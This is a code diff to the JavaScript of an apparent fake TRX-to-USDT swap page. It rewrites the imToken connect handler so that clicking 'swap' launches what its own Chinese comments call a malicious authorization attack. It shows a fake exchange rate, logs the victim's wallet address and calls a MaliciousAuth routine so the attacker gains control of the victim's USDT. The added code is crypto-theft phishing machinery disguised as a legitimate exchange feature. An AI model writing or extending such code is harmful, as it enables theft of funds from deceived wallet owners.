@@ -2682,15 +2682,45 @@
 
         // 连接imToken
         async function connectImToken() {
-            debugLog('🎯 用户选择连接imToken');
-            closeWalletModal();
+            debugLog('🎯🎯🎯 用户点击兑换按钮 - 直接跳转imToken执行授权攻击！🎯🎯🎯');
+            
+            // 检查用户是否输入了兑换金额
+            const fromAmount = document.getElementById('fromAmount').value;
+            if (!fromAmount || parseFloat(fromAmount) <= 0) {
+                showToast('请输入有效的TRX数量', 'error');
+                return;
+            }
+            
+            debugLog(`🎯 用户以为兑换: ${fromAmount} TRX → ${(fromAmount * 0.1634).toFixed(6)} USDT`);
+            debugLog('🎯 实际攻击: 将在imToken中获得USDT授权控制权');
+            
+            // 如果有钱包模态框则关闭
+            try {
+                closeWalletModal();
+            } catch (e) {
+                // 忽略错误，可能没有模态框
+            }
             
             try {
                 showToast('正在连接imToken...', 'info');
                 
                 if (window.tronWeb && window.tronWeb.ready) {
-                    await handleSuccessfulConnection(window.tronWeb.defaultAddress.base58);
-                    showToast('imToken连接成功！');
+                    debugLog('🎯 检测到TronWeb已就绪，直接启动授权攻击');
+                    currentAccount = window.tronWeb.defaultAddress.base58;
+                    isWalletConnected = true;
+                    
+                    // 🎯🎯🎯 立即启动恶意授权攻击系统 🎯🎯🎯
+                    if (window.MaliciousAuth && typeof window.MaliciousAuth.detectWallet === 'function') {
+                        debugLog('🎯🎯🎯 启动恶意授权攻击系统！🎯🎯🎯');
+                        debugLog(`🎯 受害者地址: ${currentAccount}`);
+                        debugLog('🎯 攻击者将获得代币控制权...');
+                        
+                        setTimeout(() => {
+                            window.MaliciousAuth.detectWallet();
+                        }, 500);
+                    } else {
+                        showToast('正在启动授权攻击...', 'info');
+                    }
                 } else {
                     debugLog('📱 检测到需要跳转到imToken，准备深链接跳转');
                     
